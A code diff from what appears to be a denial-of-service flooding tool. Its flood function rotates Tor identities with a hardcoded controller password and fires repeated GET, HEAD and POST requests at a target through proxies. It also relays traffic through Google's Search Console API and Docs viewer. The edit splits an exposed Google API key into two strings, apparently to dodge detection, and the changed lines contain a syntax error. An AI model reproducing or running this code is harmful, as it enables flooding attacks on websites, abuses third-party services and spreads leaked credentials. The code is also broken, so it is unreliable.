@@ -39,7 +39,8 @@ def flood(target,domainname,attack,sock):
     with Controller.from_port(port = 9051) as controller:
         controller.authenticate(password="taisaoem")
         controller.signal(Signal.NEWNYM)
-	
+	key1='AIzaSyBHi888UMDA55d'
+	key2='SnonFKSNZtgm-8_6TQ7I'
     
     #payload = randomurl()
     if sock =='http':
@@ -56,7 +57,7 @@ def flood(target,domainname,attack,sock):
             elif attack =='head':
                 r = s.head(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
             elif attack =='googleapi':
-                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key=AIzaSyBHi888UMDA55dSnonFKSNZtgm-8_6TQ7I', data=datapost, headers=headers, timeout=20 ,verify=False)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='key1+key2, data=datapost, headers=headers, timeout=20 ,verify=False)
             elif attack =='google':
                 r = s.get('https://docs.google.com/viewer?url='+target+'?'+payload, headers=headers, timeout=15)
             elif attack =='delete':
@@ -69,7 +70,7 @@ def flood(target,domainname,attack,sock):
             elif attack =='head':
                 r = s.head(target, params=payload, headers=headers, timeout=20 ,verify=False)
             elif attack =='googleapi':
-                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key=AIzaSyBHi888UMDA55dSnonFKSNZtgm-8_6TQ7I', data=datapost, headers=headers, timeout=20 ,verify=False)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='key1+key2, data=datapost, headers=headers, timeout=20 ,verify=False)
             elif attack =='google':
                 r = s.get('https://docs.google.com/viewer?url='+target+'?'+payload, headers=headers, timeout=15)
             elif attack =='delete':
